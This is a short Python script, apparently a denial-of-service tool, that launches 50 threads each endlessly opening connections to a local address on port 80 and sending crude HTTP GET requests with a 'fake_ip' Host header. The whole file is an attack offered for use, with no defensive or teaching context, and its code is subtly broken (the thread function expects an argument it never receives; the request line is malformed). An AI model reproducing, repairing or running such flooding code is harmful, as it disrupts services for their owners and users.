import threading
import socket

target = "192.168.8.1"
port = 80
fake_ip = "182.21.20.32"

def dos(self):
    while True:
        stream = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        stream.connect((target, port))
        stream.sendto((f"GET /{target}HTTP/1.1\r\n").encode("ascii"),(target, port))
        stream.sendto((f"Host: {fake_ip}\r\n\r\n").encode("ascii"), (target, port))
        stream.close()

for i in range(50):
    thread = threading.Thread(target=dos)
    thread.start()